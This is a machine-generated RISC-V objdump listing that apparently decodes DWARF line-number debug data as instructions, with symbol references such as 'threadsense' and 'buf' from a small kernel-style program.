     ef8:	0301                	.2byte	0x301
     efa:	0901                	.2byte	0x901
     efc:	0004                	.2byte	0x4
     efe:	0301                	.2byte	0x301
     f00:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     f04:	0501                	.2byte	0x501
     f06:	0309                	.2byte	0x309
     f08:	0901                	.2byte	0x901
     f0a:	001c                	.2byte	0x1c
     f0c:	0501                	.2byte	0x501
     f0e:	0319                	.2byte	0x319
     f10:	0900                	.2byte	0x900
     f12:	0004                	.2byte	0x4
     f14:	0501                	.2byte	0x501
     f16:	0320                	.2byte	0x320
     f18:	0900                	.2byte	0x900
     f1a:	0008                	.2byte	0x8
     f1c:	0501                	.2byte	0x501
     f1e:	0306                	.2byte	0x306
     f20:	0900                	.2byte	0x900
     f22:	0004                	.2byte	0x4
     f24:	0501                	.2byte	0x501
     f26:	0901031b          	addw	t1,sp,144
     f2a:	0004                	.2byte	0x4
     f2c:	0501                	.2byte	0x501
     f2e:	0900030f          	.4byte	0x900030f
     f32:	0004                	.2byte	0x4
     f34:	0501                	.2byte	0x501
     f36:	0312                	.2byte	0x312
     f38:	0901                	.2byte	0x901
     f3a:	0008                	.2byte	0x8
     f3c:	0501                	.2byte	0x501
     f3e:	030a                	.2byte	0x30a
     f40:	0900                	.2byte	0x900
     f42:	0008                	.2byte	0x8
     f44:	0501                	.2byte	0x501
     f46:	0312                	.2byte	0x312
     f48:	0901                	.2byte	0x901
     f4a:	000c                	.2byte	0xc
     f4c:	0501                	.2byte	0x501
     f4e:	030a                	.2byte	0x30a
     f50:	0900                	.2byte	0x900
     f52:	0008                	.2byte	0x8
     f54:	0501                	.2byte	0x501
     f56:	0318                	.2byte	0x318
     f58:	0901                	.2byte	0x901
     f5a:	000c                	.2byte	0xc
     f5c:	0501                	.2byte	0x501
     f5e:	030a                	.2byte	0x30a
     f60:	0900                	.2byte	0x900
     f62:	0008                	.2byte	0x8
     f64:	0501                	.2byte	0x501
     f66:	0310                	.2byte	0x310
     f68:	0902                	.2byte	0x902
     f6a:	000c                	.2byte	0xc
     f6c:	0501                	.2byte	0x501
     f6e:	0901030b          	.4byte	0x901030b
     f72:	0008                	.2byte	0x8
     f74:	0501                	.2byte	0x501
     f76:	0309                	.2byte	0x309
     f78:	0901                	.2byte	0x901
     f7a:	0004                	.2byte	0x4
     f7c:	0501                	.2byte	0x501
     f7e:	030c                	.2byte	0x30c
     f80:	0900                	.2byte	0x900
     f82:	000c                	.2byte	0xc
     f84:	0501                	.2byte	0x501
     f86:	0322                	.2byte	0x322
     f88:	097f 0008 0501 030e 	.byte	0x7f, 0x09, 0x08, 0x00, 0x01, 0x05, 0x0e, 0x03, 0x00, 0x09
     f90:	0900 
     f92:	000c                	.2byte	0xc
     f94:	0501                	.2byte	0x501
     f96:	0903030b          	.4byte	0x903030b
     f9a:	000c                	.2byte	0xc
     f9c:	0301                	.2byte	0x301
     f9e:	0901                	.2byte	0x901
     fa0:	0008                	.2byte	0x8
     fa2:	0501                	.2byte	0x501
     fa4:	0309                	.2byte	0x309
     fa6:	0901                	.2byte	0x901
     fa8:	0004                	.2byte	0x4
     faa:	0501                	.2byte	0x501
     fac:	030c                	.2byte	0x30c
     fae:	0900                	.2byte	0x900
     fb0:	000c                	.2byte	0xc
     fb2:	0501                	.2byte	0x501
     fb4:	031d                	.2byte	0x31d
     fb6:	097f 000c 0501 030e 	.byte	0x7f, 0x09, 0x0c, 0x00, 0x01, 0x05, 0x0e, 0x03, 0x00, 0x09
     fbe:	0900 
     fc0:	000c                	.2byte	0xc
     fc2:	0501                	.2byte	0x501
     fc4:	030a                	.2byte	0x30a
     fc6:	00080903          	lb	s2,0(a6)
     fca:	0501                	.2byte	0x501
     fcc:	0301                	.2byte	0x301
     fce:	0901                	.2byte	0x901
     fd0:	0004                	.2byte	0x4
     fd2:	0301                	.2byte	0x301
     fd4:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     fd8:	0501                	.2byte	0x501
     fda:	0901030f          	.4byte	0x901030f
     fde:	0010                	.2byte	0x10
     fe0:	0501                	.2byte	0x501
     fe2:	0309                	.2byte	0x309
     fe4:	0901                	.2byte	0x901
     fe6:	0008                	.2byte	0x8
     fe8:	0501                	.2byte	0x501
     fea:	0306                	.2byte	0x306
     fec:	0901                	.2byte	0x901
     fee:	0004                	.2byte	0x4
     ff0:	0501                	.2byte	0x501
     ff2:	030a                	.2byte	0x30a
     ff4:	097f 000c 0501 030c 	.byte	0x7f, 0x09, 0x0c, 0x00, 0x01, 0x05, 0x0c, 0x03, 0x02, 0x09
     ffc:	0902 
     ffe:	000c                	.2byte	0xc
    1000:	0501                	.2byte	0x501
    1002:	0301                	.2byte	0x301
    1004:	0901                	.2byte	0x901
    1006:	000c                	.2byte	0xc
    1008:	0301                	.2byte	0x301
    100a:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    100e:	0501                	.2byte	0x501
    1010:	0901030f          	.4byte	0x901030f
    1014:	0014                	.2byte	0x14
    1016:	0501                	.2byte	0x501
    1018:	0309                	.2byte	0x309
    101a:	0901                	.2byte	0x901
    101c:	0008                	.2byte	0x8
    101e:	0501                	.2byte	0x501
    1020:	0306                	.2byte	0x306
    1022:	0901                	.2byte	0x901
    1024:	0004                	.2byte	0x4
    1026:	0501                	.2byte	0x501
    1028:	097f030b          	.4byte	0x97f030b
    102c:	000c                	.2byte	0xc
    102e:	0501                	.2byte	0x501
    1030:	030e                	.2byte	0x30e
    1032:	0900                	.2byte	0x900
    1034:	000c                	.2byte	0xc
    1036:	0501                	.2byte	0x501
    1038:	0011                	.2byte	0x11
    103a:	0402                	.2byte	0x402
    103c:	0301                	.2byte	0x301
    103e:	0900                	.2byte	0x900
    1040:	0004                	.2byte	0x4
    1042:	0501                	.2byte	0x501
    1044:	000e                	.2byte	0xe
    1046:	0402                	.2byte	0x402
    1048:	0301                	.2byte	0x301
    104a:	0900                	.2byte	0x900
    104c:	0008                	.2byte	0x8
    104e:	0501                	.2byte	0x501
    1050:	030c                	.2byte	0x30c
    1052:	0902                	.2byte	0x902
    1054:	0004                	.2byte	0x4
    1056:	0501                	.2byte	0x501
    1058:	0301                	.2byte	0x301
    105a:	0901                	.2byte	0x901
    105c:	000c                	.2byte	0xc
    105e:	0301                	.2byte	0x301
    1060:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    1064:	0501                	.2byte	0x501
    1066:	000d                	.2byte	0xd
    1068:	0402                	.2byte	0x402
    106a:	0302                	.2byte	0x302
    106c:	0904                	.2byte	0x904
    106e:	0014                	.2byte	0x14
    1070:	0501                	.2byte	0x501
    1072:	0008                	.2byte	0x8
    1074:	0402                	.2byte	0x402
    1076:	0302                	.2byte	0x302
    1078:	0900                	.2byte	0x900
    107a:	000c                	.2byte	0xc
    107c:	0501                	.2byte	0x501
    107e:	000d                	.2byte	0xd
    1080:	0402                	.2byte	0x402
    1082:	0302                	.2byte	0x302
    1084:	0901                	.2byte	0x901
    1086:	0008                	.2byte	0x8
    1088:	0501                	.2byte	0x501
    108a:	0008                	.2byte	0x8
    108c:	0402                	.2byte	0x402
    108e:	0302                	.2byte	0x302
    1090:	0900                	.2byte	0x900
    1092:	000c                	.2byte	0xc
    1094:	0501                	.2byte	0x501
    1096:	0014                	.2byte	0x14
    1098:	0402                	.2byte	0x402
    109a:	0302                	.2byte	0x302
    109c:	0901                	.2byte	0x901
    109e:	0008                	.2byte	0x8
    10a0:	0001                	.2byte	0x1
    10a2:	0402                	.2byte	0x402
    10a4:	0601                	.2byte	0x601
    10a6:	0c090003          	lb	zero,192(s2)
    10aa:	0100                	.2byte	0x100
    10ac:	0d05                	.2byte	0xd05
    10ae:	0306                	.2byte	0x306
    10b0:	0902                	.2byte	0x902
    10b2:	0018                	.2byte	0x18
    10b4:	0501                	.2byte	0x501
    10b6:	0301                	.2byte	0x301
    10b8:	0901                	.2byte	0x901
    10ba:	0018                	.2byte	0x18
    10bc:	0301                	.2byte	0x301
    10be:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    10c2:	0501                	.2byte	0x501
    10c4:	0309                	.2byte	0x309
    10c6:	0901                	.2byte	0x901
    10c8:	0014                	.2byte	0x14
    10ca:	0301                	.2byte	0x301
    10cc:	0901                	.2byte	0x901
    10ce:	0008                	.2byte	0x8
    10d0:	0501                	.2byte	0x501
    10d2:	0016                	.2byte	0x16
    10d4:	0402                	.2byte	0x402
    10d6:	0301                	.2byte	0x301
    10d8:	0900                	.2byte	0x900
    10da:	0004                	.2byte	0x4
    10dc:	0501                	.2byte	0x501
    10de:	000d                	.2byte	0xd
    10e0:	0402                	.2byte	0x402
    10e2:	0301                	.2byte	0x301
    10e4:	0900                	.2byte	0x900
    10e6:	000c                	.2byte	0xc
    10e8:	0501                	.2byte	0x501
    10ea:	0012                	.2byte	0x12
    10ec:	0402                	.2byte	0x402
    10ee:	0301                	.2byte	0x301
    10f0:	0900                	.2byte	0x900
    10f2:	000c                	.2byte	0xc
    10f4:	0501                	.2byte	0x501
    10f6:	0010                	.2byte	0x10
    10f8:	0402                	.2byte	0x402
    10fa:	0301                	.2byte	0x301
    10fc:	0900                	.2byte	0x900
    10fe:	0004                	.2byte	0x4
    1100:	0501                	.2byte	0x501
    1102:	0402000b          	.4byte	0x402000b
    1106:	0301                	.2byte	0x301
    1108:	0900                	.2byte	0x900
    110a:	0004                	.2byte	0x4
    110c:	0501                	.2byte	0x501
    110e:	000a                	.2byte	0xa
    1110:	0402                	.2byte	0x402
    1112:	0301                	.2byte	0x301
    1114:	0900                	.2byte	0x900
    1116:	0004                	.2byte	0x4
    1118:	0301                	.2byte	0x301
    111a:	0902                	.2byte	0x902
    111c:	0004                	.2byte	0x4
    111e:	0501                	.2byte	0x501
    1120:	0301                	.2byte	0x301
    1122:	0901                	.2byte	0x901
    1124:	0004                	.2byte	0x4
    1126:	0301                	.2byte	0x301
    1128:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    112c:	0501                	.2byte	0x501
    112e:	0308                	.2byte	0x308
    1130:	0901                	.2byte	0x901
    1132:	0010                	.2byte	0x10
    1134:	0501                	.2byte	0x501
    1136:	09010307          	.4byte	0x9010307
    113a:	0004                	.2byte	0x4
    113c:	0501                	.2byte	0x501
    113e:	0309                	.2byte	0x309
    1140:	0902                	.2byte	0x902
    1142:	0004                	.2byte	0x4
    1144:	0501                	.2byte	0x501
    1146:	0308                	.2byte	0x308
    1148:	0901                	.2byte	0x901
    114a:	0004                	.2byte	0x4
    114c:	0501                	.2byte	0x501
    114e:	030a                	.2byte	0x30a
    1150:	097f 000c 0501 030f 	.byte	0x7f, 0x09, 0x0c, 0x00, 0x01, 0x05, 0x0f, 0x03, 0x00, 0x09
    1158:	0900 
    115a:	0008                	.2byte	0x8
    115c:	0501                	.2byte	0x501
    115e:	09030307          	.4byte	0x9030307
    1162:	000c                	.2byte	0xc
    1164:	0501                	.2byte	0x501
    1166:	0306                	.2byte	0x306
    1168:	0900                	.2byte	0x900
    116a:	0008                	.2byte	0x8
    116c:	0501                	.2byte	0x501
    116e:	0016                	.2byte	0x16
    1170:	0402                	.2byte	0x402
    1172:	0301                	.2byte	0x301
    1174:	0900                	.2byte	0x900
    1176:	000c                	.2byte	0xc
    1178:	0501                	.2byte	0x501
    117a:	04020013          	add	zero,tp,64 # 40 <buf.4>
    117e:	0301                	.2byte	0x301
    1180:	0900                	.2byte	0x900
    1182:	0008                	.2byte	0x8
    1184:	0501                	.2byte	0x501
    1186:	030c                	.2byte	0x30c
    1188:	0901                	.2byte	0x901
    118a:	000c                	.2byte	0xc
    118c:	0501                	.2byte	0x501
    118e:	0311                	.2byte	0x311
    1190:	0900                	.2byte	0x900
    1192:	0008                	.2byte	0x8
    1194:	0501                	.2byte	0x501
    1196:	030a                	.2byte	0x30a
    1198:	0900                	.2byte	0x900
    119a:	0014                	.2byte	0x14
    119c:	0501                	.2byte	0x501
    119e:	0308                	.2byte	0x308
    11a0:	0901                	.2byte	0x901
    11a2:	0004                	.2byte	0x4
    11a4:	0501                	.2byte	0x501
    11a6:	0309                	.2byte	0x309
    11a8:	000c0903          	lb	s2,0(s8)
    11ac:	0301                	.2byte	0x301
    11ae:	0901                	.2byte	0x901
    11b0:	0004                	.2byte	0x4
    11b2:	0501                	.2byte	0x501
    11b4:	0310                	.2byte	0x310
    11b6:	0901                	.2byte	0x901
    11b8:	0018                	.2byte	0x18
    11ba:	0501                	.2byte	0x501
    11bc:	030c                	.2byte	0x30c
    11be:	0900                	.2byte	0x900
    11c0:	000c                	.2byte	0xc
    11c2:	0501                	.2byte	0x501
    11c4:	09000313          	li	t1,144
    11c8:	0008                	.2byte	0x8
    11ca:	0501                	.2byte	0x501
    11cc:	0309                	.2byte	0x309
    11ce:	0900                	.2byte	0x900
    11d0:	000c                	.2byte	0xc
    11d2:	0501                	.2byte	0x501
    11d4:	030a                	.2byte	0x30a
    11d6:	097e                	.2byte	0x97e
    11d8:	000c                	.2byte	0xc
    11da:	0501                	.2byte	0x501
    11dc:	0316                	.2byte	0x316
    11de:	0905                	.2byte	0x905
    11e0:	000c                	.2byte	0xc
    11e2:	0001                	.2byte	0x1
    11e4:	0402                	.2byte	0x402
    11e6:	0601                	.2byte	0x601
    11e8:	0c090003          	lb	zero,192(s2)
    11ec:	0100                	.2byte	0x100
    11ee:	0200                	.2byte	0x200
    11f0:	0204                	.2byte	0x204
    11f2:	0c090003          	lb	zero,192(s2)
    11f6:	0100                	.2byte	0x100
    11f8:	0105                	.2byte	0x105
    11fa:	0200                	.2byte	0x200
    11fc:	0504                	.2byte	0x504
    11fe:	0306                	.2byte	0x306
    1200:	0901                	.2byte	0x901
    1202:	0004                	.2byte	0x4
    1204:	0901                	.2byte	0x901
    1206:	0010                	.2byte	0x10
    1208:	0100                	.2byte	0x100
    120a:	0301                	.2byte	0x301
    120c:	0002                	.2byte	0x2
    120e:	0500                	.2byte	0x500
    1210:	0800                	.2byte	0x800
    1212:	4900                	.2byte	0x4900
    1214:	0000                	.2byte	0x0
    1216:	0100                	.2byte	0x100
    1218:	0101                	.2byte	0x101
    121a:	000d0efb          	.4byte	0xd0efb
    121e:	0101                	.2byte	0x101
    1220:	0101                	.2byte	0x101
    1222:	0000                	.2byte	0x0
    1224:	0100                	.2byte	0x100
    1226:	0000                	.2byte	0x0
    1228:	0101                	.2byte	0x101
    122a:	1f01                	.2byte	0x1f01
    122c:	0005                	.2byte	0x5
    122e:	0000                	.2byte	0x0
    1230:	3600                	.2byte	0x3600
    1232:	0000                	.2byte	0x0
    1234:	4c00                	.2byte	0x4c00
    1236:	0000                	.2byte	0x0
    1238:	8b00                	.2byte	0x8b00
    123a:	0000                	.2byte	0x0
    123c:	f000                	.2byte	0xf000
    123e:	0000                	.2byte	0x0
    1240:	0200                	.2byte	0x200
    1242:	1f01                	.2byte	0x1f01
    1244:	0f02                	.2byte	0xf02
    1246:	9f05                	.2byte	0x9f05
    1248:	0001                	.2byte	0x1
    124a:	0100                	.2byte	0x100
    124c:	019f 0000 c601      	.byte	0x9f, 0x01, 0x00, 0x00, 0x01, 0xc6
    1252:	0000                	.2byte	0x0
    1254:	0200                	.2byte	0x200
    1256:	000000d7          	.4byte	0xd7
    125a:	0001a403          	lw	s0,0(gp)
    125e:	0400                	.2byte	0x400
    1260:	2405                	.2byte	0x2405
    1262:	0900                	.2byte	0x900
    1264:	3802                	.2byte	0x3802
    1266:	0085                	.2byte	0x85
    1268:	0080                	.2byte	0x80
    126a:	0000                	.2byte	0x0
    126c:	0300                	.2byte	0x300
    126e:	1c050127          	.4byte	0x1c050127
    1272:	10090103          	lb	sp,256(s2)
    1276:	0100                	.2byte	0x100
    1278:	1705                	.2byte	0x1705
    127a:	08090003          	lb	zero,128(s2)
    127e:	0100                	.2byte	0x100
    1280:	0e05                	.2byte	0xe05
    1282:	08090003          	lb	zero,128(s2)
    1286:	0100                	.2byte	0x100
    1288:	0f05                	.2byte	0xf05
    128a:	08090103          	lb	sp,128(s2)
    128e:	0100                	.2byte	0x100
    1290:	1c05                	.2byte	0x1c05
    1292:	08090003          	lb	zero,128(s2)
    1296:	0100                	.2byte	0x100
    1298:	1505                	.2byte	0x1505
    129a:	08090003          	lb	zero,128(s2)
    129e:	0100                	.2byte	0x100
    12a0:	0105                	.2byte	0x105
    12a2:	04090103          	lb	sp,64(s2)
    12a6:	0100                	.2byte	0x100
    12a8:	10090303          	lb	t1,256(s2)
    12ac:	0100                	.2byte	0x100
    12ae:	2205                	.2byte	0x2205
    12b0:	0c090303          	lb	t1,192(s2)
    12b4:	0100                	.2byte	0x100
    12b6:	2c05                	.2byte	0x2c05
    12b8:	10090003          	lb	zero,256(s2)
    12bc:	0100                	.2byte	0x100
    12be:	2005                	.2byte	0x2005
    12c0:	04090003          	lb	zero,64(s2)
    12c4:	0100                	.2byte	0x100
    12c6:	0c090303          	lb	t1,192(s2)
    12ca:	0100                	.2byte	0x100
    12cc:	1f05                	.2byte	0x1f05
    12ce:	1c090303          	lb	t1,448(s2)
    12d2:	0100                	.2byte	0x100
    12d4:	0a05                	.2byte	0xa05
    12d6:	10090003          	lb	zero,256(s2)
    12da:	0100                	.2byte	0x100
    12dc:	2d05                	.2byte	0x2d05
    12de:	10090003          	lb	zero,256(s2)
    12e2:	0100                	.2byte	0x100
    12e4:	1d05                	.2byte	0x1d05
    12e6:	04090003          	lb	zero,64(s2)
    12ea:	0100                	.2byte	0x100
    12ec:	1e05                	.2byte	0x1e05
    12ee:	18090303          	lb	t1,384(s2)
    12f2:	0100                	.2byte	0x100
    12f4:	0a05                	.2byte	0xa05
    12f6:	10090003          	lb	zero,256(s2)
    12fa:	0100                	.2byte	0x100
    12fc:	2d05                	.2byte	0x2d05
    12fe:	10090003          	lb	zero,256(s2)
    1302:	0100                	.2byte	0x100
    1304:	1c05                	.2byte	0x1c05
    1306:	04090003          	lb	zero,64(s2)
    130a:	0100                	.2byte	0x100
    130c:	2105                	.2byte	0x2105
    130e:	18090303          	lb	t1,384(s2)
    1312:	0100                	.2byte	0x100
    1314:	0a05                	.2byte	0xa05
    1316:	10090003          	lb	zero,256(s2)
    131a:	0100                	.2byte	0x100
    131c:	3105                	.2byte	0x3105
    131e:	10090003          	lb	zero,256(s2)
    1322:	0100                	.2byte	0x100
    1324:	1f05                	.2byte	0x1f05
    1326:	04090003          	lb	zero,64(s2)
    132a:	0100                	.2byte	0x100
    132c:	18090303          	lb	t1,384(s2)
    1330:	0100                	.2byte	0x100
    1332:	0a05                	.2byte	0xa05
    1334:	10090003          	lb	zero,256(s2)
    1338:	0100                	.2byte	0x100
    133a:	3005                	.2byte	0x3005
    133c:	10090003          	lb	zero,256(s2)
    1340:	0100                	.2byte	0x100
    1342:	1d05                	.2byte	0x1d05
    1344:	04090003          	lb	zero,64(s2)
    1348:	0100                	.2byte	0x100
    134a:	1605                	.2byte	0x1605
    134c:	18090103          	lb	sp,384(s2)
    1350:	0100                	.2byte	0x100
    1352:	2405                	.2byte	0x2405
    1354:	10090003          	lb	zero,256(s2)
    1358:	0100                	.2byte	0x100
    135a:	1405                	.2byte	0x1405
    135c:	04090003          	lb	zero,64(s2)
    1360:	0100                	.2byte	0x100
    1362:	2305                	.2byte	0x2305
    1364:	14090403          	lb	s0,320(s2)
    1368:	0100                	.2byte	0x100
    136a:	0f05                	.2byte	0xf05
    136c:	10090003          	lb	zero,256(s2)
    1370:	0100                	.2byte	0x100
    1372:	3805                	.2byte	0x3805
    1374:	10090003          	lb	zero,256(s2)
    1378:	0100                	.2byte	0x100
    137a:	2105                	.2byte	0x2105
    137c:	04090003          	lb	zero,64(s2)
    1380:	0100                	.2byte	0x100
    1382:	2305                	.2byte	0x2305
    1384:	18090103          	lb	sp,384(s2)
    1388:	0100                	.2byte	0x100
    138a:	0f05                	.2byte	0xf05
    138c:	10090003          	lb	zero,256(s2)
    1390:	0100                	.2byte	0x100
    1392:	3805                	.2byte	0x3805
    1394:	10090003          	lb	zero,256(s2)
    1398:	0100                	.2byte	0x100
    139a:	2105                	.2byte	0x2105
    139c:	04090003          	lb	zero,64(s2)
    13a0:	0100                	.2byte	0x100
    13a2:	2305                	.2byte	0x2305
    13a4:	18090103          	lb	sp,384(s2)
    13a8:	0100                	.2byte	0x100
    13aa:	0f05                	.2byte	0xf05
    13ac:	10090003          	lb	zero,256(s2)
    13b0:	0100                	.2byte	0x100
    13b2:	2e05                	.2byte	0x2e05
    13b4:	10090003          	lb	zero,256(s2)
    13b8:	0100                	.2byte	0x100
    13ba:	2105                	.2byte	0x2105
    13bc:	04090003          	lb	zero,64(s2)
    13c0:	0100                	.2byte	0x100
    13c2:	0f05                	.2byte	0xf05
    13c4:	18090103          	lb	sp,384(s2)
    13c8:	0100                	.2byte	0x100
    13ca:	2805                	.2byte	0x2805
    13cc:	08090203          	lb	tp,128(s2)
    13d0:	0100                	.2byte	0x100
    13d2:	1d05                	.2byte	0x1d05
    13d4:	08097f03          	.4byte	0x8097f03
    13d8:	0100                	.2byte	0x100
    13da:	2d05                	.2byte	0x2d05
    13dc:	08090003          	lb	zero,128(s2)
    13e0:	0100                	.2byte	0x100
    13e2:	0f05                	.2byte	0xf05
    13e4:	04090003          	lb	zero,64(s2)
    13e8:	0100                	.2byte	0x100
    13ea:	0505                	.2byte	0x505
    13ec:	08090303          	lb	t1,128(s2)
    13f0:	0100                	.2byte	0x100
    13f2:	08090103          	lb	sp,128(s2)
    13f6:	0100                	.2byte	0x100
    13f8:	0c090b03          	lb	s6,192(s2)
    13fc:	0100                	.2byte	0x100
    13fe:	04090203          	lb	tp,64(s2)
    1402:	0100                	.2byte	0x100
    1404:	0105                	.2byte	0x105
    1406:	04090103          	lb	sp,64(s2)
    140a:	0100                	.2byte	0x100
    140c:	0c09                	.2byte	0xc09
    140e:	0000                	.2byte	0x0
    1410:	0101                	.2byte	0x101
    1412:	0512                	.2byte	0x512
    1414:	0000                	.2byte	0x0
    1416:	0005                	.2byte	0x5
    1418:	0008                	.2byte	0x8
    141a:	0049                	.2byte	0x49
    141c:	0000                	.2byte	0x0
    141e:	0101                	.2byte	0x101
    1420:	fb01                	.2byte	0xfb01
    1422:	0d0e                	.2byte	0xd0e
    1424:	0100                	.2byte	0x100
    1426:	0101                	.2byte	0x101
    1428:	0001                	.2byte	0x1
    142a:	0000                	.2byte	0x0
    142c:	0001                	.2byte	0x1
    142e:	0100                	.2byte	0x100
    1430:	0101                	.2byte	0x101
    1432:	051f 0000 0000      	.byte	0x1f, 0x05, 0x00, 0x00, 0x00, 0x00
    1438:	0000                	.2byte	0x0
    143a:	0000                	.2byte	0x0
    143c:	00f0                	.2byte	0xf0
    143e:	0000                	.2byte	0x0
    1440:	004c                	.2byte	0x4c
    1442:	0000                	.2byte	0x0
    1444:	0000008b          	.4byte	0x8b
    1448:	0102                	.2byte	0x102
    144a:	021f 050f 01df      	.byte	0x1f, 0x02, 0x0f, 0x05, 0xdf, 0x01
    1450:	0000                	.2byte	0x0
    1452:	7101                	.2byte	0x7101
    1454:	0001                	.2byte	0x1
    1456:	0200                	.2byte	0x200
    1458:	01df 0000 c600      	.byte	0xdf, 0x01, 0x00, 0x00, 0x00, 0xc6
    145e:	0000                	.2byte	0x0
    1460:	0300                	.2byte	0x300
    1462:	000000d7          	.4byte	0xd7
    1466:	0504                	.2byte	0x504
    1468:	0001                	.2byte	0x1
    146a:	0209                	.2byte	0x209
    146c:	87e4                	.2byte	0x87e4
    146e:	8000                	.2byte	0x8000
    1470:	0000                	.2byte	0x0
    1472:	0000                	.2byte	0x0
    1474:	03012803          	lw	a6,48(sp)
    1478:	0908                	.2byte	0x908
    147a:	001c                	.2byte	0x1c
    147c:	0301                	.2byte	0x301
    147e:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    1482:	0301                	.2byte	0x301
    1484:	0908                	.2byte	0x908
    1486:	001c                	.2byte	0x1c
    1488:	0301                	.2byte	0x301
    148a:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    148e:	0501                	.2byte	0x501
    1490:	030a                	.2byte	0x30a
    1492:	001c0903          	lb	s2,1(s8)
    1496:	0501                	.2byte	0x501
    1498:	09000303          	lb	t1,144(zero) # 90 <threadsense.2+0xc>
    149c:	0004                	.2byte	0x4
    149e:	0501                	.2byte	0x501
    14a0:	0312                	.2byte	0x312
    14a2:	0902                	.2byte	0x902
    14a4:	0004                	.2byte	0x4
    14a6:	0501                	.2byte	0x501
    14a8:	0309                	.2byte	0x309
    14aa:	0900                	.2byte	0x900
    14ac:	0010                	.2byte	0x10
    14ae:	0501                	.2byte	0x501
    14b0:	0320                	.2byte	0x320
    14b2:	0900                	.2byte	0x900
    14b4:	0008                	.2byte	0x8
    14b6:	0501                	.2byte	0x501
    14b8:	09000317          	auipc	t1,0x9000
    14bc:	0014                	.2byte	0x14
    14be:	0501                	.2byte	0x501
    14c0:	0314                	.2byte	0x314
    14c2:	0901                	.2byte	0x901
    14c4:	0008                	.2byte	0x8
    14c6:	0501                	.2byte	0x501
    14c8:	0309                	.2byte	0x309
    14ca:	0900                	.2byte	0x900
    14cc:	0010                	.2byte	0x10
    14ce:	0501                	.2byte	0x501
    14d0:	0324                	.2byte	0x324
    14d2:	0900                	.2byte	0x900
    14d4:	0008                	.2byte	0x8
    14d6:	0501                	.2byte	0x501
    14d8:	0319                	.2byte	0x319
    14da:	0900                	.2byte	0x900
    14dc:	0014                	.2byte	0x14
    14de:	0501                	.2byte	0x501
    14e0:	0308                	.2byte	0x308
    14e2:	0901                	.2byte	0x901
    14e4:	0008                	.2byte	0x8
    14e6:	0501                	.2byte	0x501
    14e8:	0402001b          	addw	zero,tp,64 # 40 <buf.4>
    14ec:	0301                	.2byte	0x301
    14ee:	0900                	.2byte	0x900
    14f0:	0018                	.2byte	0x18
    14f2:	0501                	.2byte	0x501
    14f4:	0308                	.2byte	0x308
    14f6:	0901                	.2byte	0x901
    14f8:	0010                	.2byte	0x10
    14fa:	0501                	.2byte	0x501
    14fc:	0402001b          	addw	zero,tp,64 # 40 <buf.4>
    1500:	0301                	.2byte	0x301
    1502:	0900                	.2byte	0x900
    1504:	0018                	.2byte	0x18
    1506:	0001                	.2byte	0x1
    1508:	0402                	.2byte	0x402
    150a:	0302                	.2byte	0x302
    150c:	0010097b          	.4byte	0x10097b
    1510:	0501                	.2byte	0x501
    1512:	0014                	.2byte	0x14
    1514:	0402                	.2byte	0x402
    1516:	0301                	.2byte	0x301
    1518:	0900                	.2byte	0x900
    151a:	000c                	.2byte	0xc
    151c:	0501                	.2byte	0x501
    151e:	0016                	.2byte	0x16
    1520:	0402                	.2byte	0x402
    1522:	0301                	.2byte	0x301
    1524:	0900                	.2byte	0x900
    1526:	0014                	.2byte	0x14
    1528:	0501                	.2byte	0x501
    152a:	0011                	.2byte	0x11
    152c:	0402                	.2byte	0x402
    152e:	0301                	.2byte	0x301
    1530:	0900                	.2byte	0x900
    1532:	0008                	.2byte	0x8
    1534:	0501                	.2byte	0x501
    1536:	030d                	.2byte	0x30d
    1538:	000c0907          	.4byte	0xc0907
    153c:	0501                	.2byte	0x501
    153e:	0306                	.2byte	0x306
    1540:	0900                	.2byte	0x900
    1542:	000c                	.2byte	0xc
    1544:	0501                	.2byte	0x501
    1546:	0019                	.2byte	0x19
    1548:	0402                	.2byte	0x402
    154a:	0301                	.2byte	0x301
    154c:	0900                	.2byte	0x900
    154e:	0004                	.2byte	0x4
    1550:	0501                	.2byte	0x501
    1552:	0028                	.2byte	0x28
    1554:	0402                	.2byte	0x402
    1556:	0301                	.2byte	0x301
    1558:	0900                	.2byte	0x900
    155a:	001c                	.2byte	0x1c
    155c:	0501                	.2byte	0x501
    155e:	001f 0402 0301      	.byte	0x1f, 0x00, 0x02, 0x04, 0x01, 0x03
    1564:	0900                	.2byte	0x900
    1566:	0014                	.2byte	0x14
    1568:	0501                	.2byte	0x501
    156a:	0012                	.2byte	0x12
    156c:	0402                	.2byte	0x402
    156e:	0301                	.2byte	0x301
    1570:	0900                	.2byte	0x900
    1572:	0004                	.2byte	0x4
    1574:	0501                	.2byte	0x501
    1576:	030c                	.2byte	0x30c
    1578:	0901                	.2byte	0x901
    157a:	0008                	.2byte	0x8
    157c:	0501                	.2byte	0x501
    157e:	030a                	.2byte	0x30a
    1580:	0901                	.2byte	0x901
    1582:	0008                	.2byte	0x8
    1584:	0501                	.2byte	0x501
    1586:	0301                	.2byte	0x301
    1588:	0901                	.2byte	0x901
    158a:	0004                	.2byte	0x4
    158c:	0301                	.2byte	0x301
    158e:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    1592:	0501                	.2byte	0x501
    1594:	030a                	.2byte	0x30a
    1596:	001c0903          	lb	s2,1(s8)
    159a:	0501                	.2byte	0x501
    159c:	09000303          	lb	t1,144(zero) # 90 <threadsense.2+0xc>
    15a0:	0004                	.2byte	0x4
    15a2:	0501                	.2byte	0x501
    15a4:	0315                	.2byte	0x315
    15a6:	0902                	.2byte	0x902
    15a8:	0004                	.2byte	0x4
    15aa:	0501                	.2byte	0x501
    15ac:	030c                	.2byte	0x30c
    15ae:	0900                	.2byte	0x900
    15b0:	0010                	.2byte	0x10
    15b2:	0501                	.2byte	0x501
    15b4:	09000323          	sb	a6,134(zero) # 86 <threadsense.2+0x2>
    15b8:	0008                	.2byte	0x8
    15ba:	0501                	.2byte	0x501
    15bc:	031a                	.2byte	0x31a
    15be:	0900                	.2byte	0x900
    15c0:	0014                	.2byte	0x14
    15c2:	0501                	.2byte	0x501
    15c4:	09010317          	auipc	t1,0x9010
    15c8:	0008                	.2byte	0x8
    15ca:	0501                	.2byte	0x501
    15cc:	030c                	.2byte	0x30c
